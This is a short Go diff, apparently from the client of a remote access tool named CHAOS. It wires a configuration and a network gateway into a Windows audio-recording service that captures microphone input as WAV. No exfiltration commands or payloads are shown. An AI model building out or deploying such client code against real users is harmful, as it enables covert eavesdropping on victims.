@@ -16,15 +16,23 @@ import (
 	"unsafe"
 
 	"github.com/go-ole/go-ole"
+	"github.com/justadoll/CHAOS/client/app/gateway"
 	"github.com/justadoll/CHAOS/client/app/services"
+	"github.com/justadoll/CHAOS/client/app/shared/environment"
 	"github.com/moutend/go-wav"
 	"github.com/moutend/go-wca/pkg/wca"
 )
 
-type AudioService struct{}
+type AudioService struct {
+	Configuration *environment.Configuration
+	Gateway       gateway.Gateway
+}
 
-func NewAudioService() services.Audio {
-	return &AudioService{}
+func NewAudioService(configuration *environment.Configuration, gateway gateway.Gateway) services.Audio {
+	return &AudioService{
+		Configuration: configuration,
+		Gateway:       gateway,
+	}
 }
 
 func (d AudioService) Record(raw_seconds string) (*wav.File, error) {
@@ -318,9 +326,6 @@ func watchEvent(ctx context.Context, event uintptr) (err error) {
 }
 
 func eventEmitter(event uintptr) (err error) {
-	//if err = ole.CoInitializeEx(0, ole.COINIT_MULTITHREADED); err != nil {
-	//	return
-	//}
 	dw := wca.WaitForSingleObject(event, wca.INFINITE)
 	if dw != 0 {
 		return fmt.Errorf("failed to watch event")
